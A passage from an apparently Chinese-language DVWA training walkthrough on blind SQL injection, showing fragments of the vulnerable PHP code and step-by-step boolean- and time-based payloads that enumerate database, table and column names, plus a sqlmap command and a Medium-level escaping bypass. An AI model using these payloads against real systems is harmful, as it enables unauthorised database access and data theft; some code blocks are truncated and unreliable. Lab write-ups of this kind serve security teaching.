```
可以看到,Impossible 级别的代码采用了 PDO 技术,划清了代码与数据的界限,有效防御 SQL 注入,同时只有返回的查询结果数量为一时,才会成功输出,这样就有效预防了"脱裤",Anti-CSRFtoken 机制的加入了进一步提高了安全性.
---
## SQL_Injection(Blind)
SQL Injection(Blind),即 SQL 盲注,与一般注入的区别在于,一般的注入攻击者可以直接从页面上看到注入语句的执行结果,而盲注时攻击者通常是无法从显示页面上获取执行结果,甚至连注入语句是否执行都无从得知,因此盲注的难度要比一般注入高.目前网络上现存的 SQL 注入漏洞大多是 SQL 盲注.
**手工盲注思路**
手工盲注的过程,就像你与一个机器人聊天,这个机器人知道的很多,但只会回答"是"或者"不是",因此你需要询问它这样的问题,例如"数据库名字的第一个字母是不是a啊？",通过这种机械的询问,最终获得你想要的数据.
盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注,这里由于实验环境的限制,只演示基于布尔的盲注与基于时间的盲注.
下面简要介绍手工盲注的步骤(可与之前的手工注入作比较):
```
1.判断是否存在注入,注入是字符型还是数字型
2.猜解当前数据库名
3.猜解数据库中的表名
4.猜解表中的字段名
5.猜解数据
```
### Low
**服务器端核心代码**
```php
 0 ) {
		// Feedback for end user
		$html .= 'User ID exists in the database.';
	}
	else {
		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
		// Feedback for end user
		$html .= 'User ID is MISSING from the database.';
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
可以看到,Low 级别的代码对参数 id 没有做任何检查、过滤,存在明显的 SQL 注入漏洞,同时 SQL 语句查询返回的结果只有两种,`User ID exists in the database.`与`User ID is MISSING from the database.` 因此这里是 SQL 盲注漏洞.
**漏洞利用**
- **基于布尔的盲注**
    1. 判断是否存在注入,注入是字符型还是数字型
		```
        输入 1,显示相应用户存在
        输入 1' and 1=1 # ,显示存在
        输入 1' and 1=2 # ,显示不存在
		```
        说明存在字符型的 SQL 盲注.
	2. 猜解当前数据库名
		想要猜解数据库名,首先要猜解数据库名的长度,然后挨个猜解字符.
		```
	    输入 1' and length(database())=1 # ,显示不存在;
	    输入 1' and length(database())=2 # ,显示不存在;
	    输入 1' and length(database())=3 # ,显示不存在;
    	输入 1' and length(database())=4 # ,显示存在:
		```
		说明数据库名长度为 4.
		下面采用二分法猜解数据库名.
		```
		输入 1' and ascii(substr(database(),1,1))>97 # ,显示存在,说明数据库名的第一个字符的 ascii 值大于 97(小写字母 a 的 ascii 值);
		输入 1' and ascii(substr(database(),1,1))100 # ,显示不存在,说明数据库名的第一个字符的 ascii 值不大于 100(小写字母 d 的 ascii 值),所以数据库名的第一个字符的 ascii 值为 100,即小写字母 d.
		```
		重复上述步骤,就可以猜解出完整的数据库名(dvwa)了.
	3. 猜解数据库中的表名
		首先猜解数据库中表的数量:
		```
    	1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
    	1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显示存在
		```
		说明数据库中共有两个表
		接着挨个猜解表名:
		```
		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #
		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
		…
		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
		```
		说明第一个表名长度为9.
		```
		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在
		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))103 # 显示不存在
		```
		说明第一个表的名字的第一个字符为小写字母g.
		重复上述步骤,即可猜解出两个表名(guestbook、users).
	4. 猜解表中的字段名
		首先猜解表中字段的数量:
		```
		1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # 显示不存在
		…
		1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # 显示存在
		```
		说明 users 表有 8 个字段.
		接着挨个猜解字段名:
		```
	    1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 # 显示不存在
    	…
	    1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 # 显示存在
		```
		说明users表的第一个字段为7个字符长度.
		采用二分法,即可猜解出所有字段名.
	5. 猜解数据
		同样采用二分法.
		还可以使用基于时间的盲注:
		1. 判断是否存在注入,注入是字符型还是数字型
    		输入 `1' and sleep(2) #` ,感觉到明显延迟;
    		输入 `1 and sleep(2) #` ,没有延迟;
			说明存在字符型的基于时间的盲注.
		2. 猜解当前数据库名
			首先猜解数据名的长度:
			```
			1' and if(length(database())=1,sleep(2),1) # 没有延迟
			1' and if(length(database())=2,sleep(2),1) # 没有延迟
			1' and if(length(database())=3,sleep(2),1) # 没有延迟
			1' and if(length(database())=4,sleep(2),1) # 明显延迟
			```
			说明数据库名长度为4个字符.
			接着采用二分法猜解数据库名:
			```
			1' and if(ascii(substr(database(),1,1))>97,sleep(2),1)# 明显延迟
			…
			1' and if(ascii(substr(database(),1,1))100,sleep(2),1)# 没有延迟
			说明数据库名的第一个字符为小写字母d.
    		…
			```
			重复上述步骤,即可猜解出数据库名.
		3. 猜解数据库中的表名
			首先猜解数据库中表的数量:
			```
			1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(2),1)# 没有延迟
    		1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(2),1)# 明显延迟
			```
			说明数据库中有两个表.接着挨个猜解表名:
			```
		    1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(2),1) # 没有延迟
    		…
		    1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(2),1) # 明显延迟
			```
			说明第一个表名的长度为9个字符.
			采用二分法即可猜解出表名.
		4. 猜解表中的字段名
			首先猜解表中字段的数量:
			```
		    1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=1,sleep(2),1)# 没有延迟
    		…
		    1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=8,sleep(2),1)# 明显延迟
			```
			说明users表中有8个字段.接着挨个猜解字段名
			```
		    1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1,sleep(2),1) # 没有延迟
    		…
		    1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7,sleep(2),1) # 明显延迟
			```
			说明users表的第一个字段长度为7个字符.
			采用二分法即可猜解出各个字段名.
		5. 猜解数据
			同样采用二分法.
**sqlmap**
`sqlmap -u "http:///dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID="`
### Medium
**服务器端核心代码**
```php
 0 ) {
        // Feedback for end user
        echo 'User ID exists in the database.';
    }
    else {
        // Feedback for end user
        echo 'User ID is MISSING from the database.';
    }
    //mysql_close();
}
?>
```
可以看到,Medium 级别的代码利用 mysql_real_escape_string 函数对特殊符号 ` \x00,\n,\r,\,’,",\x1a` 进行转义,同时前端页面设置了下拉选择表单,希望以此来控制用户的输入.
**漏洞利用**
虽然前端使用了下拉选择菜单,但我们依然可以通过抓包改参数id,提交恶意构造的查询参数.
之前已经介绍了详细的盲注流程,这里就简要演示几个.
- **首先是基于布尔的盲注**
	抓包改参数 id 为 `1 and length(database())=4 #` ,显示存在,说明数据库名的长度为4个字符;
	抓包改参数 id 为 `1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ,显示存在,说明数据中的第一个表名长度为9个字符;
	抓包改参数 id 为 `1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #` ,(0×7573657273为users的16进制),显示存在,说明uers表有8个字段.
- **然后是基于时间的盲注**